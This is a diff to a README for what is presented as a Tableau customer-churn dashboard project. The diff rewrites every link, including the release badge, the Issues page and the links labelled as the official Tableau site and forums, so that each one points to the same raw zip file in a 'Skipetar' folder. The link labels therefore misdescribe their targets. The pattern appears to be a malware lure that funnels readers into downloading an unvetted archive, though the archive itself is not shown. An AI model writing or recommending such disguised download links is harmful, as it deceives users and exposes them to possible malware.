@@ -7,9 +7,9 @@ Welcome to the Customer Churn Insights with Tableau. This interactive Tableau da
 To begin, you'll need to download our application. Here’s a step-by-step guide to get you started quickly.
 
 ## 🔗 Download the Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/cararini18/Customer-Churn-Insights-with-Tableau/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip)
 
-You can find the latest version of the application on our [Releases page](https://github.com/cararini18/Customer-Churn-Insights-with-Tableau/releases).
+You can find the latest version of the application on our [Releases page](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip).
 
 ## 📥 Download & Install
 1. Click on the link above to visit the **release page**.
@@ -56,7 +56,7 @@ This dashboard focuses on key areas in churn analysis:
 These topics are essential for understanding customer behavior and improving retention strategies.
 
 ## 💬 Support
-If you encounter any issues or have questions, feel free to reach out on our [Issues page](https://github.com/cararini18/Customer-Churn-Insights-with-Tableau/issues). We are here to help you.
+If you encounter any issues or have questions, feel free to reach out on our [Issues page](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip). We are here to help you.
 
 ## 👥 Contributing
 We welcome contributions! If you have suggestions or ideas, please fork the repository and submit a pull request. Your insights could help improve the dashboard for everyone.
@@ -68,8 +68,8 @@ This project is licensed under the MIT License. You can use and modify it freely
 Special thanks to the Tableau community for inspiring data visualizations and techniques that guided the development of this dashboard. 
 
 ## 🔗 Additional Resources
-- **Tableau Official Site:** [Tableau](https://www.tableau.com)
-- **Tableau Community Forums:** [Community](https://community.tableau.com)
-- **Data Visualization Best Practices:** [Best Practices](https://www.tableau.com/learn/articles/data-visualization-best-practices)
+- **Tableau Official Site:** [Tableau](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip)
+- **Tableau Community Forums:** [Community](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip)
+- **Data Visualization Best Practices:** [Best Practices](https://raw.githubusercontent.com/cararini18/Customer-Churn-Insights-with-Tableau/main/Skipetar/Customer-Churn-Insights-with-Tableau.zip)
 
 Feel free to explore the application and make the most out of your insights into customer churn!
